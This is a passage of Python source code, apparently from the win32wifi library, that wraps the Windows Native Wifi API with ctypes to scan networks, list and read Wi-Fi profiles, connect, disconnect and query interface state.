            raise Exception("SSIDs have a maximum length of 32 characters.")
        # data = tuple(ord(char) for char in ssid)
        data = ssid
        dot11_ssid = byref(DOT11_SSID(length, data))
    else:
        dot11_ssid = None
    # TODO: Support WLAN_RAW_DATA argument.
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      dot11_ssid,
                      None,
                      None)
    if result != ERROR_SUCCESS:
        raise Exception("WlanScan failed.")
    return result


def WlanGetNetworkBssList(hClientHandle, pInterfaceGuid):
    """
        The WlanGetNetworkBssList function retrieves a list of the basic
        service set (BSS) entries of the wireless network or networks on a
        given wireless LAN interface.

        DWORD WINAPI WlanGetNetworkBssList(
            _In_        HANDLE hClientHandle,
            _In_        const GUID *pInterfaceGuid,
            _In_        const  PDOT11_SSID pDot11Ssid,
            _In_        DOT11_BSS_TYPE dot11BssType,
            _In_        BOOL bSecurityEnabled,
            _Reserved_  PVOID pReserved,
            _Out_       PWLAN_BSS_LIST *ppWlanBssList
        );
    """
    func_ref = wlanapi.WlanGetNetworkBssList
    # TODO: handle the arguments descibed below.
    # pDot11Ssid - When set to NULL, the returned list contains all of
    # available BSS entries on a wireless LAN interface.
    # dot11BssType - The BSS type of the network. This parameter is ignored if
    # the SSID of the network for the BSS list is unspecified (the pDot11Ssid
    # parameter is NULL).
    # bSecurityEnabled - A value that indicates whether security is enabled on
    # the network. This parameter is only valid when the SSID of the network
    # for the BSS list is specified (the pDot11Ssid parameter is not NULL).
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         c_void_p,
                         c_void_p,
                         c_void_p,
                         c_void_p,
                         POINTER(POINTER(WLAN_BSS_LIST))]
    func_ref.restype = DWORD
    wlan_bss_list = pointer(WLAN_BSS_LIST())
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      None,
                      None,
                      None,
                      None,
                      byref(wlan_bss_list))
    if result != ERROR_SUCCESS:
        raise Exception("WlanGetNetworkBssList failed.")
    return wlan_bss_list


def WlanGetAvailableNetworkList(hClientHandle, pInterfaceGuid):
    """
        The WlanGetAvailableNetworkList function retrieves the list of
        available networks on a wireless LAN interface.

        DWORD WINAPI WlanGetAvailableNetworkList(
            _In_        HANDLE hClientHandle,
            _In_        const GUID *pInterfaceGuid,
            _In_        DWORD dwFlags,
            _Reserved_  PVOID pReserved,
            _Out_       PWLAN_AVAILABLE_NETWORK_LIST *ppAvailableNetworkList
        );
    """
    func_ref = wlanapi.WlanGetAvailableNetworkList
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         DWORD,
                         c_void_p,
                         POINTER(POINTER(WLAN_AVAILABLE_NETWORK_LIST))]
    func_ref.restype = DWORD
    wlan_available_network_list = pointer(WLAN_AVAILABLE_NETWORK_LIST())
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      0,
                      None,
                      byref(wlan_available_network_list))
    if result != ERROR_SUCCESS:
        raise Exception("WlanGetAvailableNetworkList failed.")
    return wlan_available_network_list


def WlanGetProfileList(hClientHandle, pInterfaceGuid):
    """
        The WlanGetProfileList function retrieves the list of profiles in
        preference order.

        DWORD WINAPI WlanGetProfileList(
            _In_        HANDLE hClientHandle,
            _In_        const GUID *pInterfaceGuid,
            _Reserved_  PVOID pReserved,
            _Out_       PWLAN_PROFILE_INFO_LIST *ppProfileList
        );
    """
    func_ref = wlanapi.WlanGetProfileList
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         c_void_p,
                         POINTER(POINTER(WLAN_PROFILE_INFO_LIST))]
    func_ref.restype = DWORD
    wlan_profile_info_list = pointer(WLAN_PROFILE_INFO_LIST())
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      None,
                      byref(wlan_profile_info_list))
    if result != ERROR_SUCCESS:
        raise Exception("WlanGetProfileList failed.")
    return wlan_profile_info_list


def WlanGetProfile(hClientHandle, pInterfaceGuid, profileName):
    """
        The WlanGetProfile function retrieves all information about a specified
        wireless profile.

        DWORD WINAPI WlanGetProfile(
            _In_         HANDLE hClientHandle,
            _In_         const GUID *pInterfaceGuid,
            _In_         LPCWSTR strProfileName,
            _Reserved_   PVOID pReserved,
            _Out_        LPWSTR *pstrProfileXml,
            _Inout_opt_  DWORD *pdwFlags,
            _Out_opt_    PDWORD pdwGrantedAccess
        );
    """
    func_ref = wlanapi.WlanGetProfile
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         LPCWSTR,
                         c_void_p,
                         POINTER(LPWSTR),
                         POINTER(DWORD),
                         POINTER(DWORD)]
    func_ref.restype = DWORD
    pdw_granted_access = DWORD()
    xml = LPWSTR()
    flags = DWORD(WLAN_PROFILE_GET_PLAINTEXT_KEY)
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      profileName,
                      None,
                      byref(xml),
                      byref(flags),
                      byref(pdw_granted_access))
    if result != ERROR_SUCCESS:
        raise Exception("WlanGetProfile failed.")
    return xml

def WlanDeleteProfile(hClientHandle, pInterfaceGuid, profileName):
    """
    DWORD WINAPI WlanDeleteProfile(
        _In_             HANDLE  hClientHandle,
        _In_       const GUID    *pInterfaceGuid,
        _In_             LPCWSTR strProfileName,
        _Reserved_       PVOID   pReserved
    );
    """
    func_ref = wlanapi.WlanDeleteProfile
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         LPCWSTR,
                         c_void_p]
    func_ref.restype = DWORD
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      profileName,
                      None)
    if result != ERROR_SUCCESS:
        raise Exception("WlanDeleteProfile failed. error %d" % result, result)
    return result


class NDIS_OBJECT_HEADER(Structure):
    """
        The NDIS_OBJECT_HEADER structure packages the object type, version, and
        size information that is required in many NDIS 6.0 structures.

        typedef struct _NDIS_OBJECT_HEADER {
          UCHAR  Type;
          UCHAR  Revision;
          USHORT Size;
        } NDIS_OBJECT_HEADER, *PNDIS_OBJECT_HEADER;
    """
    _fields_ = [("Type", c_char),
                ("Revision", c_char),
                ("Size", c_ushort)]

class DOT11_BSSID_LIST(Structure):
    """
        The DOT11_BSSID_LIST structure contains a list of basic service set
        (BSS) identifiers.

        typedef struct _DOT11_BSSID_LIST {
          NDIS_OBJECT_HEADER Header;
          ULONG              uNumOfEntries;
          ULONG              uTotalNumOfEntries;
          DOT11_MAC_ADDRESS  BSSIDs[1];
        } DOT11_BSSID_LIST, *PDOT11_BSSID_LIST;
    """
    #NOTE: Would benefit from dynamic instantiation to mod # of BSSIDs
    _fields_ = [("Header", NDIS_OBJECT_HEADER),
                ("uNumOfEntries", c_ulong),
                ("uTotalNumOfEntries", c_ulong),
                ("BSSIDs", DOT11_MAC_ADDRESS * 1)]

class WLAN_CONNECTION_PARAMETERS(Structure):
    """
        The WLAN_CONNECTION_PARAMETERS structure specifies the parameters used
        when using the WlanConnect function.

        typedef struct _WLAN_CONNECTION_PARAMETERS {
          WLAN_CONNECTION_MODE wlanConnectionMode;
          LPCWSTR              strProfile;
          PDOT11_SSID          pDot11Ssid;
          PDOT11_BSSID_LIST    pDesiredBssidList;
          DOT11_BSS_TYPE       dot11BssType;
          DWORD                dwFlags;
        } WLAN_CONNECTION_PARAMETERS, *PWLAN_CONNECTION_PARAMETERS;
    """
    """
        Re strProfile:
        If wlanConnectionMode is set to wlan_connection_mode_profile, then
        strProfile specifies the name of the profile used for the connection.
        If wlanConnectionMode is set to wlan_connection_mode_temporary_profile,
        then strProfile specifies the XML representation of the profile used for
        the connection. If wlanConnectionMode is set to
        wlan_connection_mode_discovery_secure or wlan_connection_mode_discovery_unsecure,
        then strProfile should be set to NULL.

        NOTE: For now, only profile names will be accepted, per strProfileName
        elsewhere.
    """
    _fields_ = [("wlanConnectionMode", WLAN_CONNECTION_MODE),
                ("strProfile", LPCWSTR),
                ("pDot11_ssid", POINTER(DOT11_SSID)),
                ("pDesiredBssidList", POINTER(DOT11_BSSID_LIST)),
                ("dot11BssType", DOT11_BSS_TYPE),
                ("dwFlags", DWORD)]

def WlanConnect(hClientHandle, pInterfaceGuid, pConnectionParameters):
    """
    The WlanConnect function attempts to connect to a specific network.

    DWORD WINAPI WlanConnect(
            _In_        HANDLE hClientHandle,
            _In_        const GUID *pInterfaceGuid,
            _In_        const PWLAN_CONNECTION_PARAMETERS pConnectionParameters,
            _Reserved_  PVOID pReserved
    );
    """
    func_ref = wlanapi.WlanConnect
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         POINTER(WLAN_CONNECTION_PARAMETERS),
                         c_void_p]
    func_ref.restype = DWORD
    result = func_ref(hClientHandle,
                      pointer(pInterfaceGuid),
                      pointer(pConnectionParameters),
                      None)
    if result != ERROR_SUCCESS:
        raise Exception("".join(["WlanConnect failed with error ", str(result)]))
    return result

def WlanDisconnect(hClientHandle, pInterfaceGuid):
    """
    """
    func_ref = wlanapi.WlanDisconnect
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         c_void_p]
    func_ref.restype = DWORD
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      None)
    if result != ERROR_SUCCESS:
        raise Exception("WlanDisconnect failed.")
    return result

WLAN_INTF_OPCODE = c_uint
WLAN_INTF_OPCODE_DICT = {
    0x000000000: "wlan_intf_opcode_autoconf_start",
    1: "wlan_intf_opcode_autoconf_enabled",
    2: "wlan_intf_opcode_background_scan_enabled",
    3: "wlan_intf_opcode_media_streaming_mode",
    4: "wlan_intf_opcode_radio_state",
    5: "wlan_intf_opcode_bss_type",
    6: "wlan_intf_opcode_interface_state",
    7: "wlan_intf_opcode_current_connection",
    8: "wlan_intf_opcode_channel_number",
    9: "wlan_intf_opcode_supported_infrastructure_auth_cipher_pairs",
    10: "wlan_intf_opcode_supported_adhoc_auth_cipher_pairs",
    11: "wlan_intf_opcode_supported_country_or_region_string_list",
    12: "wlan_intf_opcode_current_operation_mode",
    13: "wlan_intf_opcode_supported_safe_mode",
    14: "wlan_intf_opcode_certified_safe_mode",
    15: "wlan_intf_opcode_hosted_network_capable",
    16: "wlan_intf_opcode_management_frame_protection_capable",
    0x0fffffff: "wlan_intf_opcode_autoconf_end",
    0x10000100: "wlan_intf_opcode_msm_start",
    17: "wlan_intf_opcode_statistics",
    18: "wlan_intf_opcode_rssi",
    0x1fffffff: "wlan_intf_opcode_msm_end",
    0x20010000: "wlan_intf_opcode_security_start",
    0x2fffffff: "wlan_intf_opcode_security_end",
    0x30000000: "wlan_intf_opcode_ihv_start",
    0x3fffffff: "wlan_intf_opcode_ihv_end"
}

WLAN_OPCODE_VALUE_TYPE = c_uint
WLAN_OPCODE_VALUE_TYPE_DICT = {
    0: "wlan_opcode_value_type_query_only",
    1: "wlan_opcode_value_type_set_by_group_policy",
    2: "wlan_opcode_value_type_set_by_user",
    3: "wlan_opcode_value_type_invalid"
}

class WLAN_ASSOCIATION_ATTRIBUTES(Structure):
    """
    """
    _fields_ = [("dot11Ssid", DOT11_SSID),
                ("dot11BssType", DOT11_BSS_TYPE),
                ("dot11Bssid", DOT11_MAC_ADDRESS),
                ("dot11PhyType", DOT11_PHY_TYPE),
                ("uDot11PhyIndex", c_ulong),
                ("wlanSignalQuality", WLAN_SIGNAL_QUALITY),
                ("ulRxRate", c_ulong),
                ("ulTxRate", c_ulong)]

class WLAN_SECURITY_ATTRIBUTES(Structure):
    """
    """
    _fields_ = [("bSecurityEnabled", BOOL),
                ("bOneXEnabled", BOOL),
                ("dot11AuthAlgorithm", DOT11_AUTH_ALGORITHM_TYPE),
                ("dot11CipherAlgorithm", DOT11_CIPHER_ALGORITHM_TYPE)]

class WLAN_CONNECTION_ATTRIBUTES(Structure):
    """
        The WlanQueryInterface function queries various parameters of a
        specified interface.

        typedef struct _WLAN_CONNECTION_ATTRIBUTES {
          WLAN_INTERFACE_STATE        isState;
          WLAN_CONNECTION_MODE        wlanConnectionMode;
          WCHAR                       strProfileName[256];
          WLAN_ASSOCIATION_ATTRIBUTES wlanAssociationAttributes;
          WLAN_SECURITY_ATTRIBUTES    wlanSecurityAttributes;
        } WLAN_CONNECTION_ATTRIBUTES, *PWLAN_CONNECTION_ATTRIBUTES;
    """
    _fields_ = [("isState", WLAN_INTERFACE_STATE),
                ("wlanConnectionMode", WLAN_CONNECTION_MODE),
                ("strProfileName", c_wchar * 256),
                ("wlanAssociationAttributes", WLAN_ASSOCIATION_ATTRIBUTES),
                ("wlanSecurityAttributes", WLAN_SECURITY_ATTRIBUTES)]

WLAN_INTF_OPCODE_TYPE_DICT = {
    "wlan_intf_opcode_autoconf_enabled": c_bool,
    "wlan_intf_opcode_background_scan_enabled": c_bool,
    "wlan_intf_opcode_radio_state": WLAN_RADIO_STATE,
    "wlan_intf_opcode_bss_type": DOT11_BSS_TYPE,
    "wlan_intf_opcode_interface_state": WLAN_INTERFACE_STATE,
    "wlan_intf_opcode_current_connection": WLAN_CONNECTION_ATTRIBUTES,
    "wlan_intf_opcode_channel_number": c_ulong,
    #"wlan_intf_opcode_supported_infrastructure_auth_cipher_pairs": \
            #WLAN_AUTH_CIPHER_PAIR_LIST,
    #"wlan_intf_opcode_supported_adhoc_auth_cipher_pairs": \
            #WLAN_AUTH_CIPHER_PAIR_LIST,
    #"wlan_intf_opcode_supported_country_or_region_string_list": \
            #WLAN_COUNTRY_OR_REGION_STRING_LIST,
    "wlan_intf_opcode_media_streaming_mode": c_bool,
    #"wlan_intf_opcode_statistics": WLAN_STATISTICS,
    "wlan_intf_opcode_rssi": c_long,
    "wlan_intf_opcode_current_operation_mode": c_ulong,
    "wlan_intf_opcode_supported_safe_mode": c_bool,
    "wlan_intf_opcode_certified_safe_mode": c_bool
}

def WlanQueryInterface(hClientHandle, pInterfaceGuid, OpCode):
    """
        DWORD WINAPI WlanQueryInterface(
          _In_        HANDLE hClientHandle,
          _In_        const GUID *pInterfaceGuid,
          _In_        WLAN_INTF_OPCODE OpCode,
          _Reserved_  PVOID pReserved,
          _Out_       PDWORD pdwDataSize,
          _Out_       PVOID *ppData,
          _Out_opt_   PWLAN_OPCODE_VALUE_TYPE pWlanOpcodeValueType
        );
    """
    func_ref = wlanapi.WlanQueryInterface
    #TODO: Next two lines sketchy due to incomplete implementation.
    opcode_name = WLAN_INTF_OPCODE_DICT[OpCode.value]
    return_type = WLAN_INTF_OPCODE_TYPE_DICT[opcode_name]
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         WLAN_INTF_OPCODE,
                         c_void_p,
                         POINTER(DWORD),
                         POINTER(POINTER(return_type)),
                         POINTER(WLAN_OPCODE_VALUE_TYPE)]
    func_ref.restype = DWORD
    pdwDataSize = DWORD()
    ppData = pointer(return_type())
    pWlanOpcodeValueType = WLAN_OPCODE_VALUE_TYPE()
    result = func_ref(hClientHandle,
                      byref(pInterfaceGuid),
                      OpCode,
                      None,
                      pdwDataSize,
                      ppData,
                      pWlanOpcodeValueType)
    if result != ERROR_SUCCESS:
        raise Exception("WlanQueryInterface failed.")
    return ppData


# win32wifi - Windows Native Wifi Api Python library.
# Copyright (C) 2016 - Shaked Gitelman
#
# Forked from: PyWiWi - <https://github.com/6e726d/PyWiWi>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Author: Andres Blanco     (6e726d)    <6e726d@gmail.com>
# Author: Shaked Gitelman   (almondg)   <shaked.dev@gmail.com>
#

from ctypes import *
from datetime import datetime
from enum import Enum
import functools
import time
import xmltodict

from comtypes import GUID

NULL = None


class WirelessInterface(object):
    def __init__(self, wlan_iface_info):
        self.description = wlan_iface_info.strInterfaceDescription
        self.guid = GUID(wlan_iface_info.InterfaceGuid)
        self.guid_string = str(wlan_iface_info.InterfaceGuid)
        self.state = wlan_iface_info.isState
        self.state_string = WLAN_INTERFACE_STATE_DICT[self.state]

    def __str__(self):
        result = ""
        result += "Description: %s\n" % self.description
        result += "GUID: %s\n" % self.guid
        result += "State: %s" % self.state_string
        return result


class InformationElement(object):
    def __init__(self, element_id, length, body):
        self.element_id = element_id
        self.length = length
        self.body = body

    def __str__(self):
        result = ""
        result += "Element ID: %d\n" % self.element_id
        result += "Length: %d\n" % self.length
        result += "Body: %r" % self.body
        return result


class WirelessNetwork(object):
    def __init__(self, wireless_network):
        self.ssid = wireless_network.dot11Ssid.SSID[:DOT11_SSID_MAX_LENGTH]
        self.profile_name = wireless_network.ProfileName
        self.bss_type = DOT11_BSS_TYPE_DICT_KV[wireless_network.dot11BssType]
        self.number_of_bssids = wireless_network.NumberOfBssids
        self.connectable = bool(wireless_network.NetworkConnectable)
        self.number_of_phy_types = wireless_network.NumberOfPhyTypes
        self.signal_quality = wireless_network.wlanSignalQuality
        self.security_enabled = bool(wireless_network.SecurityEnabled)
        auth = wireless_network.dot11DefaultAuthAlgorithm
        self.auth = DOT11_AUTH_ALGORITHM_DICT[auth]
        cipher = wireless_network.dot11DefaultCipherAlgorithm
        self.cipher = DOT11_CIPHER_ALGORITHM_DICT[cipher]
        self.flags = wireless_network.Flags

    def __str__(self):
        result = ""
        if not self.profile_name:
            self.profile_name = "<No Profile>"
        result += "Profile Name: %s\n" % self.profile_name
        result += "SSID: %s\n" % self.ssid
        result += "BSS Type: %s\n" % self.bss_type
        result += "Number of BSSIDs: %d\n" % self.number_of_bssids
        result += "Connectable: %r\n" % self.connectable
        result += "Number of PHY types: %d\n" % self.number_of_phy_types
        result += "Signal Quality: %d%%\n" % self.signal_quality
        result += "Security Enabled: %r\n" % self.security_enabled
        result += "Authentication: %s\n" % self.auth
        result += "Cipher: %s\n" % self.cipher
        result += "Flags: %d\n" % self.flags
        return result


class WirelessNetworkBss(object):
    def __init__(self, bss_entry):
        self.ssid = bss_entry.dot11Ssid.SSID[:DOT11_SSID_MAX_LENGTH]
        self.link_quality = bss_entry.LinkQuality
        self.bssid = ":".join(map(lambda x: "%02X" % x, bss_entry.dot11Bssid))
        self.bss_type = DOT11_BSS_TYPE_DICT_KV[bss_entry.dot11BssType]
        self.phy_type = DOT11_PHY_TYPE_DICT[bss_entry.dot11BssPhyType]
        self.rssi = bss_entry.Rssi
        self.capabilities = bss_entry.CapabilityInformation
        self.__process_information_elements(bss_entry)
        self.__process_information_elements2()

    def __process_information_elements(self, bss_entry):
        self.raw_information_elements = ""
        bss_entry_pointer = addressof(bss_entry)
        ie_offset = bss_entry.IeOffset
        data_type = (c_char * bss_entry.IeSize)
        ie_buffer = data_type.from_address(bss_entry_pointer + ie_offset)
        for byte in ie_buffer:
            self.raw_information_elements += str(byte)

    def __process_information_elements2(self):
        MINIMAL_IE_SIZE = 3
        self.information_elements = []
        aux = self.raw_information_elements
        index = 0
        while (index < len(aux) - MINIMAL_IE_SIZE):
            eid = ord(aux[index])
            index += 1
            length = ord(aux[index])
            index += 1
            body = aux[index:index + length]
            index += length
            ie = InformationElement(eid, length, body)
            self.information_elements.append(ie)

    def __str__(self):
        result = ""
        result += "BSSID: %s\n" % self.bssid
        result += "SSID: %s\n" % self.ssid
        result += "Link Quality: %d%%\n" % self.link_quality
        result += "BSS Type: %s\n" % self.bss_type
        result += "PHY Type: %s\n" % self.phy_type
        result += "Capabilities: %d\n" % self.capabilities
        result += "rssi: %d\n" % self.rssi
        #result += "\n"
        #result += "Raw Information Elements:\n"
        #result += "%r" % self.raw_information_elements
        #result += "\nInformation Elements:\n"
        #for ie in self.information_elements:
            #lines = str(ie).split("\n")
            #for line in lines:
                #result += " + %s\n" % line
                #result=result
            #result += "\n"
        #print (result)
        return result


class WirelessProfile(object):
    def __init__(self, wireless_profile, xml):
        self.name = wireless_profile.ProfileName
        self.flags = wireless_profile.Flags
        self.xml = xml

        self._parse_xml(self.xml)

    def _parse_xml(self, xml):
        d = xmltodict.parse(xml)
        self.ssid = d['WLANProfile']['SSIDConfig']['SSID']['name']

    def __str__(self):
        result = ""
        result += "Profile Name: %s\n" % self.name
        result += "Flags: %d\n" % self.flags
        result += "XML:\n"
        result += "%s" % self.xml
        return result


class MSMNotificationData(object):
    def __init__(self, msm_notification_data):
        assert isinstance(msm_notification_data, WLAN_MSM_NOTIFICATION_DATA)

        self.connection_mode = WLAN_CONNECTION_MODE_KV[msm_notification_data.wlanConnectionMode]
        self.profile_name = msm_notification_data.strProfileName
        self.ssid = msm_notification_data.dot11Ssid.SSID[:msm_notification_data.dot11Ssid.SSIDLength]
        self.bss_type = DOT11_BSS_TYPE_DICT_KV[msm_notification_data.dot11BssType]
        self.mac_addr = ":".join(["{:02x}".format(x) for x in msm_notification_data.dot11MacAddr[:6]])

    def __str__(self):
        result = ""
        result += "Connection Mode: %s\n" % self.connection_mode
        result += "Profile Name: %s\n" % self.profile_name
        result += "SSID: %s\n" % self.ssid
        result += "BSS Type: %s\n" % self.bss_type
        result += "MAC: %s\n" % self.mac_addr
        return result


class ACMConnectionNotificationData(object):
    def __init__(self, acm_notification_data):
        assert isinstance(acm_notification_data, WLAN_CONNECTION_NOTIFICATION_DATA)

        self.connection_mode = WLAN_CONNECTION_MODE_KV[acm_notification_data.wlanConnectionMode]
        self.profile_name = acm_notification_data.strProfileName
        self.ssid = acm_notification_data.dot11Ssid.SSID[:acm_notification_data.dot11Ssid.SSIDLength]
        self.bss_type = DOT11_BSS_TYPE_DICT_KV[acm_notification_data.dot11BssType]
        self.security_enabled = acm_notification_data.bSecurityEnabled

    def __str__(self):
        result = ""
        result += "Connection Mode: %s\n" % self.connection_mode
        result += "Profile Name: %s\n" % self.profile_name
        result += "SSID: %s\n" % self.ssid
        result += "BSS Type: %s\n" % self.bss_type
        result += "Security Enabled: %r\n" % bool(self.security_enabled)
        return result


def getWirelessInterfaces():
    """Returns a list of WirelessInterface objects based on the wireless
       interfaces available."""
    interfaces_list = []
    handle = WlanOpenHandle()
    wlan_ifaces = WlanEnumInterfaces(handle)
    # Handle the WLAN_INTERFACE_INFO_LIST pointer to get a list of
    # WLAN_INTERFACE_INFO structures.
    data_type = wlan_ifaces.contents.InterfaceInfo._type_
    num = wlan_ifaces.contents.NumberOfItems
    ifaces_pointer = addressof(wlan_ifaces.contents.InterfaceInfo)
    wlan_interface_info_list = (data_type * num).from_address(ifaces_pointer)
    for wlan_interface_info in wlan_interface_info_list:
        wlan_iface = WirelessInterface(wlan_interface_info)
        interfaces_list.append(wlan_iface)
    WlanFreeMemory(wlan_ifaces)
    WlanCloseHandle(handle)
    return interfaces_list


def getWirelessNetworkBssList(wireless_interface):
    """Returns a list of WirelessNetworkBss objects based on the wireless
       networks availables."""
    networks = []
    handle = WlanOpenHandle()
    bss_list = WlanGetNetworkBssList(handle, wireless_interface.guid)
    # Handle the WLAN_BSS_LIST pointer to get a list of WLAN_BSS_ENTRY
    # structures.
    data_type = bss_list.contents.wlanBssEntries._type_
    num = bss_list.contents.NumberOfItems
    bsss_pointer = addressof(bss_list.contents.wlanBssEntries)
    bss_entries_list = (data_type * num).from_address(bsss_pointer)
    for bss_entry in bss_entries_list:
        networks.append(WirelessNetworkBss(bss_entry))
        #print(WirelessNetworkBss(bss_entry))

    WlanFreeMemory(bss_list)
    WlanCloseHandle(handle)
    #print(networks[2])
    return networks


def getWirelessAvailableNetworkList(wireless_interface):
    """Returns a list of WirelessNetwork objects based on the wireless
       networks availables."""
    networks = []
    handle = WlanOpenHandle()
    network_list = WlanGetAvailableNetworkList(handle, wireless_interface.guid)
    # Handle the WLAN_AVAILABLE_NETWORK_LIST pointer to get a list of
    # WLAN_AVAILABLE_NETWORK structures.
    data_type = network_list.contents.Network._type_
    num = network_list.contents.NumberOfItems
    network_pointer = addressof(network_list.contents.Network)
    networks_list = (data_type * num).from_address(network_pointer)

    for network in networks_list:
        networks.append(WirelessNetwork(network))

    WlanFreeMemory(network_list)
    WlanCloseHandle(handle)
    return networks


def getWirelessProfileXML(wireless_interface, profile_name):
    handle = WlanOpenHandle()
    xml_data = WlanGetProfile(handle,
                              wireless_interface.guid,
                              LPCWSTR(profile_name))
    xml = xml_data.value
    WlanFreeMemory(xml_data)
    WlanCloseHandle(handle)
    return xml


def getWirelessProfiles(wireless_interface):
    """Returns a list of WirelessProfile objects based on the wireless
       profiles."""
    profiles = []
    handle = WlanOpenHandle()
    profile_list = WlanGetProfileList(handle, wireless_interface.guid)
    # Handle the WLAN_PROFILE_INFO_LIST pointer to get a list of
    # WLAN_PROFILE_INFO structures.
    data_type = profile_list.contents.ProfileInfo._type_
    num = profile_list.contents.NumberOfItems
    profile_info_pointer = addressof(profile_list.contents.ProfileInfo)
    profiles_list = (data_type * num).from_address(profile_info_pointer)
    xml_data = None  # safety: there may be no profiles
    for profile in profiles_list:
        xml_data = WlanGetProfile(handle,
                                  wireless_interface.guid,
                                  profile.ProfileName)
        profiles.append(WirelessProfile(profile, xml_data.value))
    WlanFreeMemory(xml_data)
    WlanFreeMemory(profile_list)
    WlanCloseHandle(handle)
    return profiles


def deleteProfile(wireless_interface, profile_name):
    handle = WlanOpenHandle()
    result = WlanDeleteProfile(handle, wireless_interface.guid, profile_name)
    WlanCloseHandle(handle)

    return result


def disconnect(wireless_interface):
    """
    """
    handle = WlanOpenHandle()
    WlanDisconnect(handle, wireless_interface.guid)
    WlanCloseHandle(handle)


# TODO(shaked): There is an error 87 when trying to connect to a wifi network.
def connect(wireless_interface, connection_params):
    """
        The WlanConnect function attempts to connect to a specific network.

        DWORD WINAPI WlanConnect(
          _In_        HANDLE hClientHandle,
          _In_        const GUID *pInterfaceGuid,
          _In_        const PWLAN_CONNECTION_PARAMETERS pConnectionParameters,
          _Reserved_  PVOID pReserved
        );

        connection_params should be a dict with this structure:
        { "connectionMode": "valid connection mode string",
          "profile": ("profile name string" | "profile xml" | None)*,
          "ssid": "ssid string",
          "bssidList": [ "desired bssid string", ... ],
          "bssType": valid bss type int,
          "flags": valid flag dword in 0x00000000 format }
        * Currently, only the name string is supported here.
    """
    handle = WlanOpenHandle()
    cnxp = WLAN_CONNECTION_PARAMETERS()
    connection_mode = connection_params["connectionMode"]
    connection_mode_int = WLAN_CONNECTION_MODE_VK[connection_mode]
    cnxp.wlanConnectionMode = WLAN_CONNECTION_MODE(connection_mode_int)
    # determine strProfile
    if connection_mode == ('wlan_connection_mode_profile' or  # name
                               'wlan_connection_mode_temporary_profile'):  # xml
        cnxp.strProfile = LPCWSTR(connection_params["profile"])
    else:
        cnxp.strProfile = NULL
    # ssid
    if connection_params["ssid"] is not None:
        dot11Ssid = DOT11_SSID()
        dot11Ssid.SSID = connection_params["ssid"]
        dot11Ssid.SSIDLength = len(connection_params["ssid"])
        cnxp.pDot11Ssid = pointer(dot11Ssid)
    else:
        cnxp.pDot11Ssid = NULL
    # bssidList
    # NOTE: Before this can actually support multiple entries,
    #   the DOT11_BSSID_LIST structure must be rewritten to
    #   dynamically resize itself based on input.
    if connection_params["bssidList"] is not None:
        bssids = []
        for bssidish in connection_params["bssidList"]:
            bssidish = tuple(int(n, 16) for n in bssidish.split(b":"))
            bssids.append((DOT11_MAC_ADDRESS)(*bssidish))
        bssidListEntries = c_ulong(len(bssids))
        bssids = (DOT11_MAC_ADDRESS * len(bssids))(*bssids)
        bssidListHeader = NDIS_OBJECT_HEADER()
        bssidListHeader.Type = NDIS_OBJECT_TYPE_DEFAULT
        bssidListHeader.Revision = DOT11_BSSID_LIST_REVISION_1  # chr()
        bssidListHeader.Size = c_ushort(sizeof(DOT11_BSSID_LIST))
        bssidList = DOT11_BSSID_LIST()
        bssidList.Header = bssidListHeader
        bssidList.uNumOfEntries = bssidListEntries
        bssidList.uTotalNumOfEntries = bssidListEntries
        bssidList.BSSIDs = bssids
        cnxp.pDesiredBssidList = pointer(bssidList)
    else:
        cnxp.pDesiredBssidList = NULL  # required for XP
    # look up bssType
    # bssType must match type from profile if a profile is provided
    bssType = DOT11_BSS_TYPE_DICT_VK[connection_params["bssType"]]
    cnxp.dot11BssType = DOT11_BSS_TYPE(bssType)
    # flags
    cnxp.dwFlags = DWORD(connection_params["flags"])
    print(cnxp)
    result = WlanConnect(handle,
                         wireless_interface.guid,
                         cnxp)
    WlanCloseHandle(handle)
    return result


def dot11bssidToString(dot11Bssid):
    return ":".join(map(lambda x: "%02X" % x, dot11Bssid))


def queryInterface(wireless_interface, opcode_item):
    """
    """
    handle = WlanOpenHandle()
    opcode_item_ext = "".join(["wlan_intf_opcode_", opcode_item])
    opcode = None
    for key, val in WLAN_INTF_OPCODE_DICT.items():
        if val == opcode_item_ext:
            opcode = WLAN_INTF_OPCODE(key)
            break
    result = WlanQueryInterface(handle, wireless_interface.guid, opcode)
    WlanCloseHandle(handle)
    r = result.contents
    if opcode_item == "interface_state":
        # WLAN_INTERFACE_STATE
        ext_out = WLAN_INTERFACE_STATE_DICT[r.value]
    elif opcode_item == "current_connection":
        # WLAN_CONNECTION_ATTRIBUTES
        isState = WLAN_INTERFACE_STATE_DICT[r.isState]
        wlanConnectionMode = WLAN_CONNECTION_MODE_KV[r.wlanConnectionMode]
        strProfileName = r.strProfileName
        aa = r.wlanAssociationAttributes
        wlanAssociationAttributes = {
            "dot11Ssid": aa.dot11Ssid.SSID,
            "dot11BssType": DOT11_BSS_TYPE_DICT_KV[aa.dot11BssType],
            "dot11Bssid": dot11bssidToString(aa.dot11Bssid),
            "dot11PhyType": DOT11_PHY_TYPE_DICT[aa.dot11PhyType],
            "uDot11PhyIndex": c_long(aa.uDot11PhyIndex).value,
            "wlanSignalQuality": c_long(aa.wlanSignalQuality).value,
            "ulRxRate": c_long(aa.ulRxRate).value,
            "ulTxRate": c_long(aa.ulTxRate).value,
